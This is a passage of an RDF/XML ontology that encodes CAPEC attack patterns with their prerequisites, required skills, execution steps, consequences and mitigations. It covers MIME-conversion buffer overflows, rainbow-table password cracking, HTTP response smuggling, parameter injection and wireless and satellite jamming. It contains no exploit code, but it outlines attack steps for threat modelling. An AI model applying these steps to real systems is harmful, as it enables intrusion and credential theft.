        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Cryptanalysis of Cellular Encryption"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack447">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#608"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::327::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Reveals IMSI and IMEI for tracking of retransmission device and enables further follow-on attacks by revealing black network control messages. (e.g.  revealing IP addresses of enterprise servers for VOIP connectivity)::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::327::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::None::"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Adversaries can rent commercial supercomputer time globally to conduct cryptanalysis on encrypted data captured from mobile devices. Foreign governments have their own cryptanalysis technology and capabilities. Commercial cellular standards for encryption (GSM and CDMA) are also subject to adversary cryptanalysis.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Prevent the use of Lan Man and NT Lan Man authentication on severs and apply patch KB2871997 to Windows 7 and higher systems.::Monitor system and domain logs for abnormal credential access.::Leverage system penetration testing and other defense in depth methods to determine vulnerable systems within a domain.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack200"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Stay up to date with third party vendor patches::Disable the 7 to 8 bit conversion. This can be done by removing the F=9 flag from all Mailer specifications in the sendmail.cf file. For example  a sendmail.cf file with these changes applied should look similar to (depending on your system and configuration): Mlocal  P=/usr/libexec/mail.local  F=lsDFMAw5:/-@qrmn  S=10/30  R=20/40 T=DNS/RFC822/X-Unix A=mail -d $u Mprog  P=/bin/sh  F=lsDFMoqeu  S=10/30  R=20/40 D=$z:/ T=X-Unix A=sh -c $u This can be achieved for the Mlocal and Mprog Mailers by modifying the .mc file to include the following lines: define(`LOCAL_MAILER_FLAGS&apos; ifdef(`LOCAL_MAILER_FLAGS&apos; `translit(LOCAL_MAILER_FLAGS  `9&apos;)&apos; `rmn&apos;)) define(`LOCAL_SHELL_FLAGS&apos; ifdef(`LOCAL_SHELL_FLAGS&apos; `translit(LOCAL_SHELL_FLAGS  `9&apos;)&apos; `eu&apos;)) and then rebuilding the sendmail.cf file using m4(1). From Exploiting Software  please see reference below.::Use the sendmail restricted shell program (smrsh)::Use mail.local::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack254">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#42">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:100::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#MIME Conversion"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::120::119::74::20::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Determine whether the mail server is unpatched and is potentially vulnerable to one of the known MIME conversion buffer overflows (e.g. Sendmail 8.8.3 and 8.8.4).::STEP:2:PHASE:Explore:DESCRIPTION:Identify places in the system where vulnerable MIME conversion routines may be used.::STEP:3:PHASE:Exploit:DESCRIPTION:Send e-mail messages to the target system with specially crafted headers that trigger the buffer overflow and execute the shell code.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker446">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#635">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:165::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Alternative Execution Due to Deceptive Filenames"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack446">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#635"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::162::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::162::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The use of the file must be controlled by the file extension.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Disable script execution.::Ensure that sufficient input validation is performed for any potentially untrusted data before it is used in any privileged context or zone::Limit the flow of untrusted data into the privileged areas of the system that run in the higher trust zone::Limit the sites that are being added to the local machine zone and restrict the privileges of the code running in that zone to the bare minimum::Ensure proper HTML output encoding before writing user supplied data to the page::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack280"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker313">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#114"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack313"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::287::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An authentication mechanism or subsystem implementing some form of authentication such as passwords  digest authentication  security certificates  etc. which is flawed in some way.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A client application  command-line access to a binary  or scripting language capable of interacting with the authentication mechanism.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Enforce principle of least privilege.::Design: Ensure all input is validated  and does not contain file system commands::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Design: For interactive user applications  consider if direct file system interface is necessary  instead consider having the application proxy communication.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories  programs  and interfaces that grant direct access to executables.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack297"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker312">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#474"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack312"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::522::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An authoritative or reputable signer is storing their private signature key with insufficient protection.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Knowledge of common location methods and access methods to sensitive data:LEVEL:Low::SKILL:Ability to compromise systems containing sensitive data:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker445">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#237"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack445"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::693::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A framework-based language that supports code signing and sandbox (such as Java  .Net  JavaScript  and Flash) Deployed code that has been signed by its authoring vendor  or a partner::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker must have a good knowledge of the platform specific mechanisms of signing and verifying code. Most code signing and verification schemes are based on use of cryptography  the attacker needs to have an understand of these cryptographic operations in good detail.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Employ strict adherence to interpretations of HTTP messages wherever possible.::Implementation: Encode header information provided by user input so that user-supplied content is not interpreted by intermediaries.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack276">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#273">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:220::NATURE:PeerOf:CAPEC ID:33::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#HTTP Response Smuggling"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::74::436::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker133">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#562"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack133"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker266">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#115"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack266"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::287::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An authentication mechanism or subsystem implementing some form of authentication such as passwords  digest authentication  security certificates  etc.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A client application  such as a web browser  or a scripting language capable of interacting with the target.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker399">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#605"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack399"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Lack of anti-jam features in cellular technology (2G  3G  4G  LTE)::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This attack can be performed by low capability attackers with commercially available tools.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker265">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#166"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack265"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::306::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted application must have a reset function that returns the configuration of the application to an earlier state.::The reset functionality must be inadequately protected against use.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. In some cases  the attacker may need special client applications in order to execute the reset functionality.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker132">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#137">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Parameter Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack132">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#137"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::88::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data Successful parameter injection attacks mean a compromise to integrity of the application.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::88::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must use a parameter encoding where separators and parameter identifiers are expressed in regular text.::The target application must accept a string as user input  fail to sanitize characters that have a special meaning in the parameter encoding  and insert the user-supplied string in an encoding which is then processed.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. The only requirement is the ability to provide string input to the target.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: For any security checks that are performed on the client side  ensure that these checks are duplicated on the server side.::Design: Ship client-side application with integrity checks (code signing) when possible.::Design: Use obfuscation and other techniques to prevent reverse engineering the client code.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack319"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker398">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#604"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack398"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Lack of anti-jam features in 802.11::Lack of authentication on deauthentication/disassociation packets on 802.11-based networks::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This attack can be performed by low capability attackers with freely available tools. Commercial tools are also available that can target select networks or all WiFi networks within a range of several miles.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker264">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#620"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack264"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::757::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker397">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#599"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack397"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A terrestrial satellite jammer with a signal more powerful than that of the satellite attempting to communicate with the target. The adversary must know the location of the target satellite dish.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker131">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#123"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack131"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::119::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must identify a programmatic means for interacting with a buffer  such as vulnerable C code  and be able to provide input to this interaction.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Configuration: If using a Web Application Firewall (WAF)  filters should be carefully configured to detect abnormal HTTP requests Design: Perform URL encoding Implementation: Use strict regular expressions in URL rewriting Implementation: Beware of multiple occurrences of a parameter in a Query String::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack314"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use FAT file systems which do not support Alternate Data Streams.::Implementation: Use Vista dir with the -R switch or utility to find Alternate Data Streams and take appropriate action with those discovered.::Implementation: Use products that are Alternate Data Stream aware for virus scanning and system security operations.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack260">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#168">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:636::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Windows ::DATA Alternate Data Stream"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::212::69::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Assess design documentation prior to development to ensure that they function as intended and without any malicious functionality.::Ensure that design documentation is saved in a secure location and has proper access controls set in place to avoid unnecessary modification.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack148">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#447">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:438::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Design Alteration"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:IntegrityTECHNICAL IMPACT:Alter Execution Logic::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker396">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#559"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack396"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This attack requires the knowledge of the satellite&apos;s coordinates for targeting.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A satellite uplink station.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker263">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#149"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack263"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted application must create names for temporary files using a predictable procedure  e.g. using sequentially increasing numbers.::The attacker must be able to see the names of the files the target is creating.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker130">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#278"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack130"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted application or service must rely on web service protocols in such a way that malicious manipulation of them can alter functionality.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must be able to manipulate the communications to the targeted application or service.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use of hardened baseband firmware on retransmission device to detect and prevent the use of weak cellular encryption.::Monitor cellular RF interface to detect the usage of weaker-than-expected cellular encryption.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack447"/>
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack222"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker440">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#253"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack440"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::829::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Target application server must allow remote files to be included.The malicious file must be placed on the remote machine previously.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker137">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#487"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack137"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires the ability to generate a large amount of ICMP traffic to send to the target server.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Limit privileges of user accounts so service changes can only be performed by authorized administrators. Also monitor any service changes that may occur inadvertently.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack511"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker269">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#55">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:49::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Rainbow Table Password Cracking"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack269">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#55"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::261::521::262::263::693::719::916::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine application&apos;s/system&apos;s password policy) Determine the password policies of the target application/system.TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers  special characters  etc.).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Explore:DESCRIPTION:(Obtain password hashes) An attacker gets access to the database table storing hashes of passwords or potentially just discovers a hash of an individual password.TECHNIQUE:Obtain copy of database table or flat file containing password hashes (by breaking access controls  using SQL Injection  etc.):TECHNIQUE:Obtain password hashes from platform-specific storage locations (e.g. Windows registry):TECHNIQUE:Sniff network packets containing password hashes.::STEP:3:PHASE:Exploit:DESCRIPTION:(Run rainbow table-based password cracking tool) An attacker finds or writes a password cracking tool that uses a previously computed rainbow table for the right hashing algorithm. It helps if the attacker knows what hashing algorithm was used by the password system.TECHNIQUE:Run rainbow table-based password cracking tool such as Ophcrack or RainbowCrack. Reduction function must depend on application&apos;s/system&apos;s password policy.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::261::521::262::263::693::719::916::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Hash of the original password is available to the attacker. For a better chance of success  an attacker should have more than one hash of the original password  and ideally the whole table.::Salt was not used to create the hash of the original password. Otherwise the rainbow tables have to be re-computed  which is very expensive and will make the attack effectively infeasible (especially if salt was added in iterations).::The system uses one factor password based authentication.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:A variety of password cracking tools are available that can leverage a rainbow table. The more difficult part is to obtain the password hash(es) in the first place.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Rainbow table of password hash chains with the right algorithm used. A password cracking tool that leverages this rainbow table will also be required. Hash(es) of the password is required.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker136">
    <j.0:relatedTo>
